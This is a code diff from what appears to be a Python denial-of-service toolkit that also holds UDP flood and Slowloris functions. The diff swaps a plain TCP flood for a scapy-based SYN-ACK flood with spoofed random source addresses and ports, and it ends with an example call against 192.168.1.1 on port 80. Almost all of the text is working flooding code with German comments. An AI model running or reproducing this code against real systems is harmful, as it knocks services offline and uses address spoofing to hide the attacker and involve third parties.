@@ -36,18 +36,24 @@ def udp_flood(ip, port, packet_size):
             pass
 
 # TCP Flood
-def tcp_flood(ip, port, packet_size):
-    global packet_counter
-    while not stop_event.is_set():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, port))
-            sock.send(random._urandom(packet_size))
-            packet_counter += 1
-        except:
-            pass
-        finally:
-            sock.close()
+from scapy.all import *
+
+def syn_ack_flood(target_ip, target_port, packet_count):
+    for _ in range(packet_count):
+        # Gefälschte Quelle (kann zufällig sein)
+        src_ip = RandIP()
+        src_port = RandShort()
+        
+        # SYN-ACK Paket erstellen
+        ip_layer = IP(src=src_ip, dst=target_ip)
+        tcp_layer = TCP(sport=src_port, dport=target_port, flags='SA')  # SYN-ACK Flags
+        packet = ip_layer / tcp_layer
+        
+        # Paket senden
+        send(packet, verbose=False)
+
+# Beispielaufruf
+syn_ack_flood("192.168.1.1", 80, 1000)
 
 # Slowloris (TCP Keep-Alive)
 def slowloris(ip, port):
